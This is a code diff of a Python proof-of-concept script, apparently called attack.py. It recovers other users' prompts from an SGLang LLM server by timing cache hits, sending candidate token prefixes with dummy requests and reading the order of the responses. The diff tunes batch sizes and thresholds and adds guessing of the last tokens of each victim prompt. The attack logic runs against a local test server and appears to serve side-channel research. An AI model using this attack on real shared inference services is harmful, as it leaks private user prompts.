@@ -12,22 +12,25 @@ from transformers.models import LlamaForCausalLM
 
 MODEL_NAME_OR_PATH = "/home/marcorentap/.cache/huggingface/hub/models--meta-llama--Llama-3.2-1B-Instruct/snapshots/9213176726f574b556790deb65791e0c5aa438b6"
 SGLANG_SERVER = "http://localhost:30000"
-CANDIDATES_SIZE = 32
-DUMMIES_SIZE = 32
+CANDIDATES_SIZE = 8
+DUMMIES_SIZE = 16
 MAX_TOKENS = 128
 TEMPERATURE = 0
 
 # How many post dummies until candidates are considered wrong
 # Should be approximately equal to running batch size
 # Too large -> false positive, Too small -> false negative
-POST_DUMMY_THRESHOLD = 16
+POST_DUMMY_THRESHOLD = 4
 
 # How many candidate batches to try until giving up. Set to 0 to never give up (try all possible tokens)
 MAX_CANDIDATE_BATCHES = 5
 
+# How many tokens to guess from victims
+TOKENS_TO_GUESS = 3
+
 model = LlamaForCausalLM.from_pretrained(MODEL_NAME_OR_PATH)
 tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME_OR_PATH)
-client = httpx.AsyncClient(timeout=120)
+client = httpx.AsyncClient(timeout=None)
 
 
 # All tokens except the least likely, sorted by probability
@@ -126,7 +129,6 @@ async def peek_one(prefix: List[int]) -> List[List[int]]:
             tasks.append(
                 asyncio.create_task(send_request(post_dummy, f"post_dummy_{i}"))
             )
-        await asyncio.sleep(0.2)
 
         response_order = []
         for task in asyncio.as_completed(tasks):
@@ -138,6 +140,7 @@ async def peek_one(prefix: List[int]) -> List[List[int]]:
 
         n_post_dummies = 0
         next_prefixes = []
+        next_toks = []
         for res in response_order:
             if res["id"].startswith("post_dummy"):
                 n_post_dummies += 1
@@ -149,37 +152,43 @@ async def peek_one(prefix: List[int]) -> List[List[int]]:
                 # Since batch_candidates aligns to batch_cand_toks, and all are flat-indexed by idx
                 cand_tok = cand_toks[idx]
                 next_prefix = prefix + [cand_tok]
+                next_toks.append(cand_tok)
                 next_prefixes.append(next_prefix)
 
         if next_prefixes:
+            print("Next: ", tokenizer.batch_decode(next_toks))
             return next_prefixes
 
     return []
 
 
 async def main():
-    input = json.load(open("input.json"))
+    if len(sys.argv) < 2:
+        print("Usage: attack.py victims.json")
+        sys.exit(1)
+
+    filename = sys.argv[1]
+    input = json.load(open(filename))
     victims = input["victims"]
-    known_prefixes = input["prefixes"]
 
     victim_toks = [tokenizer.encode(victim) for victim in victims]
-    known_prefix_toks = [
-        tokenizer.encode(known_prefix) for known_prefix in known_prefixes
-    ]
+    known_prefix_toks = [victim_tok[:-TOKENS_TO_GUESS] for victim_tok in victim_toks]
 
     # Flush Cache
     requests.post(SGLANG_SERVER + "/flush_cache")
 
     # Victim
+    tasks = []
     for i, victim_tok in enumerate(victim_toks):
-        await send_request(victim_tok, f"victim_{i}")
+        tasks.append(asyncio.create_task(send_request(victim_tok, f"victim_{i}")))
+    await asyncio.gather(*tasks)
 
     found_victim_count = 0
     for known_prefix in known_prefix_toks:
         found_victims = []
         prefixes = [known_prefix]
         while len(prefixes) > 0:
-            prefix = prefixes.pop(0)
+            prefix = prefixes.pop()
             print()
             print("Trying:", tokenizer.decode(prefix))
 
@@ -201,18 +210,19 @@ async def main():
                     max_match_len = common
                     closest_victim_toks = v
 
-            # If no victims left, go to next known prefix
-            if not had_comparison or max_match_len < len(prefix) / 2:
+            # If no matching victim, continue
+            if not had_comparison or max_match_len < len(prefix):
                 print("No matching victim")
-                break
+                continue
 
             print("Closest victim:", tokenizer.decode(closest_victim_toks))
 
             # Compare the length with most matching victim
             if len(prefix) >= len(closest_victim_toks):
                 found_victims.append(prefix)
-                print("Found victim:", tokenizer.decode(closest_victim_toks))
                 found_victim_count += 1
+                print("Found victim:", tokenizer.decode(closest_victim_toks))
+                print(f"Total: {found_victim_count}/{len(victims)} victims")
                 continue
 
             next_prefixes = await peek_one(prefix)
